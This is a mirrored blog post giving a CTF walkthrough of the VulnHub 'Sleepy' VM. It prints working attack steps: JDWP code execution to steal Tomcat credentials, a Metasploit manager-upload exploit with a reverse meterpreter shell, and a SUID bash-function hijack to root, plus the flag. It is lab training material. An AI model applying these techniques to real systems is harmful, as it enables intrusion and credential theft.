<!DOCTYPE HTML>
<html lang="en-US">

<!-- Mirrored from highon.coffee/blog/sleepy-ctf-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Dec 2022 15:33:29 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<script src="../../cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
<title>/dev/random: Sleepy Walkthrough CTF</title>
<meta name="description" content="/dev/random: Sleepy walkthrough - step by step walkthrough for Sleepy a VulnHub Boot2Root CTF challenge.">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="../../feed.xml">

<link rel="stylesheet" type="text/css" href="../../css/screen.css">

<link rel="icon" type="image/x-icon" href="../../favicon.ico">
<!--[if lt IE 9]>
  <script src="/js/html5shiv.min.js"></script>
  <script src="/js/respond.min.js"></script>
  <![endif]-->


</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="../../index.html">Home</a>
</li>
<li class="current">
<a href="../index.html">Blog</a>
</li>
<li class="">
<a href="../../about/index.html"><span class="hide-on-mobiles">About</span></a>
</li>
<li class="">
<a href="../../services/index.html"><span class="hide-on-mobiles">Services</span></a>
</li>
</ul>
</nav>
<div class="grid">
<div class="unit one-third center-on-mobiles">
<h1>
<a href="../../index.html">
<span>Zero-day</span>
<img src="../../img/highoncoffee.png" width="300" height="115" alt="Logo">
</a>
</h1>
</div>
<nav class="main-nav unit two-thirds hide-on-mobiles">
<ul>
<li class="">
<a href="../../index.html">Home</a>
</li>
<li class="current">
<a href="../index.html">Blog</a>
</li>
<li class="">
<a href="../../about/index.html"><span class="hide-on-mobiles">About</span></a>
</li>
<li class="">
<a href="../../services/index.html"><span class="hide-on-mobiles">Services</span></a>
</li>
</ul>
</nav>
</div>
</header>
<section class="blog">
<div class="grid">
<div class="docs-nav-mobile unit whole show-on-mobiles">
<select onchange="if (this.value) window.location.href=this.value">
<option value="">Navigate the blog…</option>
<option value="/blog/">Home</option>
<optgroup label="v1.x">
<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</option>
<option value="/blog/insecure-direct-object-reference-idor/">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</option>
<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet: Commands & Examples (2022)</option>
<option value="/blog/encrypted-note-taking-solution/">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</option>
<option value="/blog/dns-tunnel-dnscat2-cheat-sheet/">DNS Tunneling dnscat2 Cheat Sheet</option>
<option value="/blog/ssh-lateral-movement-cheat-sheet/">SSH Lateral Movement Cheat Sheet</option>
<option value="/blog/android-app-pen-testing-environment/">Android Pen Testing Environment Setup</option>
<option value="/blog/password-reset-security-testing-cheat-sheet/">Password Reset Testing Cheat Sheet</option>
<option value="/blog/ssrf-cheat-sheet/">SSRF Cheat Sheet & Bypass Techniques</option>
<option value="/blog/penetration-testing-tools-cheat-sheet/">Pen Testing Tools Cheat Sheet</option>
<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
<option value="/blog/vi-cheat-sheet/">Vim Cheat Sheet [2022 Update] + NEOVIM</option>
<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
</optgroup>
</select>
</div>
<div class="unit four-fifths">
<article>
<h2>
/dev/random: Sleepy Walkthrough CTF
<a href="index.html" class="permalink" title="Permalink">∞</a>
</h2>
<span class="post-category">
<span class="label">
walkthroughs
</span>
</span>
<div class="post-meta">
 <span class="post-date">
26 Nov 2015
</span>
<a href="https://twitter.com/Arr0way" class="post-author">
<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
Arr0way
</a>
</div>
<div class="post-content">
<div class="coffee-rating">
<table>
<tbody>
<tr>
<td>
<p><code>Coffee Difficulty Rating:</code></p>
</td>
<td>
<p>&lt;/i&gt;<i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
</td>
</tr>
</tbody>
</table>
</div>
<ul id="markdown-toc">
<li><a href="#description" id="markdown-toc-description">Description</a> <ul>
<li><a href="#jserv-enumeration" id="markdown-toc-jserv-enumeration">JServ Enumeration</a></li>
<li><a href="#jdwp-enumeration" id="markdown-toc-jdwp-enumeration">JDWP Enumeration</a></li>
</ul>
</li>
<li><a href="#apache-tomcat-jserv-proxy-setup" id="markdown-toc-apache-tomcat-jserv-proxy-setup">Apache Tomcat JServ Proxy setup</a> <ul>
<li><a href="#apache-tomcat-proxy-setup-script" id="markdown-toc-apache-tomcat-proxy-setup-script">Apache Tomcat Proxy Setup Script</a></li>
</ul>
</li>
<li><a href="#remote-exploitation" id="markdown-toc-remote-exploitation">Remote Exploitation</a> <ul>
<li><a href="#meterpreter-shell" id="markdown-toc-meterpreter-shell">Meterpreter Shell</a></li>
</ul>
</li>
<li><a href="#local-privilege-escalation" id="markdown-toc-local-privilege-escalation">Local Privilege Escalation</a> <ul>
<li><a href="#enumeration" id="markdown-toc-enumeration">Enumeration</a></li>
<li><a href="#binary-interrogation" id="markdown-toc-binary-interrogation">Binary Interrogation</a></li>
<li><a href="#bash-function-manipulation" id="markdown-toc-bash-function-manipulation">Bash Function Manipulation</a></li>
<li><a href="#root-flag" id="markdown-toc-root-flag">Root Flag</a></li>
</ul>
</li>
</ul>
<h2 id="description">Description</h2>
<p><strong>Sleepy</strong> is part of the /dev/random: series created by Sagi-, it’s a little more difficult than <a href="../pipe-ctf-walkthrough/index.html">Pipe</a> depending on your skill set.</p>
<p><strong>Author:</strong> <a href="https://twitter.com/s4gi_">@s4gi_ </a></p>
<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/devrandom-sleepy,123/">/dev/random: Sleepy</a> via <a href="https://twitter.com/VulnHub">@VulnHub</a></p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash">_________.__                              
/   _____/|  |   ____   ____ ______ ___.__.
<span class="se">\_</span>____  <span class="se">\ </span>|  | _/ __ <span class="se">\_</span>/ __ <span class="se">\\</span>____ &lt;   |  |
/        <span class="se">\|</span>  |_<span class="se">\ </span> ___/<span class="se">\ </span> ___/|  |_&gt; <span class="o">&gt;</span>___  |
/_______  /|____/<span class="se">\_</span>__  <span class="o">&gt;</span><span class="se">\_</span>__  <span class="o">&gt;</span>   __// ____| ·VM·
      <span class="se">\/</span>           <span class="se">\/</span>     <span class="se">\/</span>|__|   <span class="se">\/</span></code></pre></figure>
<p>##Enumeration</p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>root:~]# nmap <span class="nt">-v</span> <span class="nt">-p</span> 1-65535 <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-sT</span> 192.168.30.146

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 2.0.8 or later
8009/tcp open  ajp13   syn-ack Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
9001/tcp open  jdwp    syn-ack Java Debug Wire Protocol <span class="o">(</span>Reference Implementation<span class="o">)</span> version 1.6 1.7.0_71
MAC Address: 00:0C:29:8C:41:F7 <span class="o">(</span>VMware<span class="o">)</span>
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device <span class="nb">type</span>: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Uptime guess: 49.709 days <span class="o">(</span>since Wed Oct  7 20:28:44 2015<span class="o">)</span></code></pre></figure>
<p>###Service Enumeration</p>
<div class="mobile-side-scroller">
<table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
<th>Version Detection</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<pc><p><code>TCP: 21</code></p></pc>
</td>
<td>
<pc><p>FTP</p></pc>
</td>
<td>
<pc><p>vsftpd 2.0.8 or later</p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>TCP: 8009</code></p></pc>
</td>
<td>
<pc><p>ajp13</p></pc>
</td>
<td>
<pc><p>Apache Jserv (Protocol v1.3)</p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>TCP: 9001</code></p></pc>
</td>
<td>
<pc><p>jdwp</p></pc>
</td>
<td>
<pc><p>Java Debug Wire Protocol version 1.6 1.7.0_71</p></pc>
</td>
</tr>
</tbody>
</table>
</div>
<p>###FTP Enumeration</p>
<p>As nmap indicated, FTP had anonymous access enabled. Interrogation of the service revealed <code>/pub/sleepy.png </code></p>
<p><img src="../../img/blog/sleepy/sleepy.png" alt="base64 image" /></p>
<h3 id="jserv-enumeration">JServ Enumeration</h3>
<p>JServ protocol is exposed with no web server proxy, JServ acts as a proxy and requires a web server to proxy it’s requests.</p>
<h3 id="jdwp-enumeration">JDWP Enumeration</h3>
<p>Unauthenticated JDWP is exposed:</p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>root]# jdb <span class="nt">-attach</span> 192.168.30.146:9001</code></pre></figure>
<p>Research indicated it was possible to interrupt threads, with the command: <code>interupt</code> allowing for arbitrary code execution.</p>
<div class="note tip">
<h5>JDWP Commands</h5>
<p>Type <code>help</code> for a list of <b>JDWP</b> commands.</p>
</div>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>root]# jdb <span class="nt">-attach</span> 192.168.30.146:9001                                                                                                                                                 
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
<span class="o">&gt;</span> threads
Group system:
  <span class="o">(</span>java.lang.ref.Reference<span class="nv">$ReferenceHandler</span><span class="o">)</span>0x19d Reference Handler cond. waiting
  <span class="o">(</span>java.lang.ref.Finalizer<span class="nv">$FinalizerThread</span><span class="o">)</span>0x19e  Finalizer         cond. waiting
  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x19f                         Signal Dispatcher running
Group main:
  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x1a1                         main              sleeping
<span class="o">&gt;</span> interrupt 0x1a1
<span class="o">&gt;</span>
Exception occurred: java.lang.InterruptedException <span class="o">(</span>uncaught<span class="o">)</span><span class="s2">"thread=main"</span>, java.lang.Thread.sleep<span class="o">()</span>, <span class="nv">line</span><span class="o">=</span><span class="nt">-1</span> <span class="nv">bci</span><span class="o">=</span><span class="nt">-1</span>

main[1] print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/"</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
java.lang.NullPointerException
	at com.sun.tools.example.debug.expr.LValue.argumentsMatch<span class="o">(</span>LValue.java:268<span class="o">)</span>
	at com.sun.tools.example.debug.expr.LValue.resolveOverload<span class="o">(</span>LValue.java:399<span class="o">)</span>
	at com.sun.tools.example.debug.expr.LValue.makeNewObject<span class="o">(</span>LValue.java:820<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.AllocationExpression<span class="o">(</span>ExpressionParser.java:1119<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.PrimaryPrefix<span class="o">(</span>ExpressionParser.java:961<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.PrimaryExpression<span class="o">(</span>ExpressionParser.java:909<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.PostfixExpression<span class="o">(</span>ExpressionParser.java:834<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpressionNotPlusMinus<span class="o">(</span>ExpressionParser.java:757<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpression<span class="o">(</span>ExpressionParser.java:687<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.MultiplicativeExpression<span class="o">(</span>ExpressionParser.java:611<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.AdditiveExpression<span class="o">(</span>ExpressionParser.java:580<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.ShiftExpression<span class="o">(</span>ExpressionParser.java:542<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.RelationalExpression<span class="o">(</span>ExpressionParser.java:504<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.InstanceOfExpression<span class="o">(</span>ExpressionParser.java:485<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.EqualityExpression<span class="o">(</span>ExpressionParser.java:455<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.AndExpression<span class="o">(</span>ExpressionParser.java:433<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.ExclusiveOrExpression<span class="o">(</span>ExpressionParser.java:412<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.InclusiveOrExpression<span class="o">(</span>ExpressionParser.java:391<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.ConditionalAndExpression<span class="o">(</span>ExpressionParser.java:370<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.ConditionalOrExpression<span class="o">(</span>ExpressionParser.java:349<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.ConditionalExpression<span class="o">(</span>ExpressionParser.java:321<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.Expression<span class="o">(</span>ExpressionParser.java:256<span class="o">)</span>
	at com.sun.tools.example.debug.expr.ExpressionParser.evaluate<span class="o">(</span>ExpressionParser.java:81<span class="o">)</span>
	at com.sun.tools.example.debug.tty.Commands.evaluate<span class="o">(</span>Commands.java:114<span class="o">)</span>
	at com.sun.tools.example.debug.tty.Commands.doPrint<span class="o">(</span>Commands.java:1654<span class="o">)</span>
	at com.sun.tools.example.debug.tty.Commands<span class="nv">$3</span>.action<span class="o">(</span>Commands.java:1680<span class="o">)</span>
	at com.sun.tools.example.debug.tty.Commands<span class="nv">$AsyncExecution$1</span>.run<span class="o">(</span>Commands.java:66<span class="o">)</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/"</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> null
main[1] <span class="nb">exit</span></code></pre></figure>
<p>The Java code above copied the <code>/etc/tomcat/tomcat-users.xml</code> file to <code>/var/ftp/pub</code>. The default location for pub ftp on CentOS.</p>
<p>tomcat-users.xml was download to the attacking machine and the following credentials were extracted:</p>
<div class="mobile-side-scroller">
<table>
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<pc><p><code>sl33py</code></p></pc>
</td>
<td>
<pc><p><code>Gu3SSmYStR0NgPa$sw0rD!</code></p></pc>
</td>
</tr>
</tbody>
</table>
</div>
<p>Full tomcat-users.xml file for completeness:</p>
<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span>
<span class="c">&lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;</span>
<span class="nt">&lt;tomcat-users&gt;</span>
<span class="c">&lt;!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.
--&gt;</span>
<span class="c">&lt;!--
  NOTE:  The sample user and role entries below are wrapped in a comment
  and thus are ignored when reading this file. Do not forget to remove
  &lt;!.. ..&gt; that surrounds them.
--&gt;</span>
  <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"tomcat"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"role1"</span><span class="nt">/&gt;</span>
 <span class="c">&lt;!-- &lt;user username="tomcat" password="tomcat" roles="tomcat,manager-gui,admin,manager-jmx,admin-gui,admin-script,manager,manager-script,manager-status"/&gt; --&gt;</span>
  <span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"both"</span> <span class="na">password=</span><span class="s">"tomcat"</span> <span class="na">roles=</span><span class="s">"tomcat,role1"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"role1"</span> <span class="na">password=</span><span class="s">"tomcat"</span> <span class="na">roles=</span><span class="s">"role1"</span><span class="nt">/&gt;</span>

<span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"admin"</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"admin-gui"</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"admin-script"</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"manager"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"manager-gui"</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"manager-script"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"manager-jmx"</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"manager-status"</span><span class="nt">/&gt;</span>
<span class="c">&lt;!-- &lt;user name="admin" password="adminadmin" roles="admin,manager,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status" /&gt; --&gt;</span>


<span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"sl33py"</span> <span class="na">password=</span><span class="s">"Gu3SSmYStR0NgPa$sw0rD!"</span> <span class="na">roles=</span><span class="s">"tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status"</span><span class="nt">/&gt;</span>

<span class="nt">&lt;/tomcat-users&gt;</span></code></pre></figure>
<h2 id="apache-tomcat-jserv-proxy-setup">Apache Tomcat JServ Proxy setup</h2>
<p>During enumeration JServ protocol was discovered exposed on the default port <code>TCP: 8009</code>. A local Apache proxy was setup on the attacking machine proxying requests back to the target JServ application server.</p>
<h3 id="apache-tomcat-proxy-setup-script">Apache Tomcat Proxy Setup Script</h3>
<p>Script for automation of JServ Proxy on Attacking machine:</p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
    apt-get <span class="nb">install </span>libapache2-mod-jk <span class="nt">-y</span>
    <span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s#JkWorkersFile /etc/libapache2-mod-jk/workers.properties#JkWorkersFile /etc/apache2/workers.properties#g'</span> /etc/apache2/mods-enabled/jk.conf
    <span class="nb">cp</span> /etc/libapache2-mod-jk/workers.properties /etc/apache2/
    <span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s#worker.ajp13_worker.host=localhost#worker.ajp13_worker.host=192.168.30.146#g'</span> /etc/apache2/workers.properties
    <span class="nb">sed</span>  <span class="s1">'/\Host\&gt;/i JKMount /* ajp13_worker'</span> /etc/apache2/sites-enabled/000-default.conf
    a2enmod proxy_http proxy_ajp
    service apache2 restart</code></pre></figure>
<p>Tomcat should be exposed when visiting <code>http://127.0.0.1</code> in <strong>Firefox</strong>.</p>
<p><img src="../../img/blog/sleepy/tomcat-jserv-apache-proxy.png" alt="Tomcat JServ Apache Proxy" /></p>
<h2 id="remote-exploitation">Remote Exploitation</h2>
<p><strong>Tomcat</strong> is now exposed and login credentials have been obtained, it’s now possible to login via Tomcat Manager and leverage a shell via Metasploit.</p>
<div class="note info">
<h5>FingerprintCheck</h5>
<p>The option: <code>set FingerprintCheck false</code> needs to be configured or meterpreter will throw the following error:</p>
<p><code>[-] [2015.11.26-13:17:44] Exploit aborted due to failure: not-found: The target <br /> server fingerprint "Apache/2.4.10 (Debian)" does not match "(?-mix:Apache.*(Coy<br />ote|Tomcat))", use 'set FingerprintCheck false' to disable this check.</code></p>
</div>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msf exploit<span class="o">(</span>tomcat_mgr_upload<span class="o">)</span> <span class="o">&gt;</span> show options

Module options <span class="o">(</span>exploit/multi/http/tomcat_mgr_upload<span class="o">)</span>:

   Name       Current Setting         Required  Description
   <span class="nt">----</span>       <span class="nt">---------------</span>         <span class="nt">--------</span>  <span class="nt">-----------</span>
   PASSWORD   Gu3SSmYStR0NgPa<span class="nv">$sw0rD</span><span class="o">!</span>  no        The password <span class="k">for </span>the specified username
   Proxies                            no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
   RHOST      0.0.0.0                 <span class="nb">yes       </span>The target address
   RPORT      80                      <span class="nb">yes       </span>The target port
   TARGETURI  /manager                <span class="nb">yes       </span>The URI path of the manager app <span class="o">(</span>/html/upload and /undeploy will be used<span class="o">)</span>
   USERNAME   sl33py                  no        The username to authenticate as
   VHOST                              no        HTTP server virtual host


Payload options <span class="o">(</span>java/meterpreter/reverse_tcp<span class="o">)</span>:

   Name   Current Setting  Required  Description
   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   LHOST  192.168.30.134   <span class="nb">yes       </span>The listen address
   LPORT  4444             <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Java Universal</code></pre></figure>
<h3 id="meterpreter-shell">Meterpreter Shell</h3>
<p>An unprivileged meterpreter shell was obtained:</p>
<p><img src="../../img/blog/sleepy/meterpreter.png" alt="meterpreter shell" /></p>
<h2 id="local-privilege-escalation">Local Privilege Escalation</h2>
<h3 id="enumeration">Enumeration</h3>
<p>Searching for SUID files discovered a binary called <code>nightmare</code>.</p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash">bash-4.2<span class="nv">$ </span>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-print</span> 2&gt; /dev/null
find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-print</span> 2&gt; /dev/null
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/nightmare
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib64/dbus-1/dbus-daemon-launch-helper</code></pre></figure>
<h3 id="binary-interrogation">Binary Interrogation</h3>
<p>The <code>nightmare</code> binary was copied to the attacking machine and interrogated with strings.</p>
<p><img src="../../img/blog/sleepy/strings.png" alt="nightmare binary strings" /></p>
<p>The binary <code>nightmare</code> appears to execute <code>/user/bin/sl</code> as the root user (SUID is on the execute bit).</p>
<h3 id="bash-function-manipulation">Bash Function Manipulation</h3>
<p>Function manipulation was leveraged to execute <code>/bin/sh</code> by the nightmare binary, providing a root shell thus fully compromising the system.</p>
<div class="note warning">
<h5>Nightmare Process</h5>
<p>After execution of <code>/usr/bin/nightmare</code> it was necessary to kill the <code>nightmare</code> process using <code>kill -2</code> via another shell in order for the root shell to spawn correctly. To search for the process use <code>ps aux | grep nightmare</code> and use <code>kill -2</code> command to kill the pid.</p>
</div>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash">meterpreter <span class="o">&gt;</span> shell
Process 11 created.
Channel 14 created.


python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
bash-4.2<span class="err">$</span>

bash-4.2<span class="err">$</span>

bash-4.2<span class="nv">$ </span><span class="k">function</span> /usr/bin/sl<span class="o">()</span> <span class="o">{</span> /bin/sh<span class="p">;</span> <span class="o">}</span>
<span class="k">function</span> /usr/bin/sl<span class="o">()</span> <span class="o">{</span> /bin/sh<span class="p">;</span> <span class="o">}</span>
bash-4.2<span class="nv">$ </span><span class="nb">export</span> <span class="nt">-f</span> /usr/bin/sl
<span class="nb">export</span> <span class="nt">-f</span> /usr/bin/sl
bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
/usr/bin/nightmare
Error opening terminal: unknown.
<span class="o">[</span>+] Again <span class="o">[</span>y/n]? sh-4.2# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
sh-4.2# <span class="nb">cat</span> /root/flag.txt
<span class="nb">cat</span> /root/flag.txt
Well <span class="k">done</span><span class="o">!</span>

Here<span class="s1">'s your flag: 3eb030c6ab099b0a355712fe38d59ffb</span></code></pre></figure>
<h3 id="root-flag">Root Flag</h3>
<p><img src="../../img/blog/sleepy/root-flag.png" alt="nightmare binary strings" /></p>
<p>Thanks for the VM :)</p>
</div>
<section class="share-box">
<div class="grid">
<div class="unit whole">
<div class="grid pane">
<div class="unit whole center-on-mobiles">
<div class="pane-content">
<h2>Share this on...</h2>
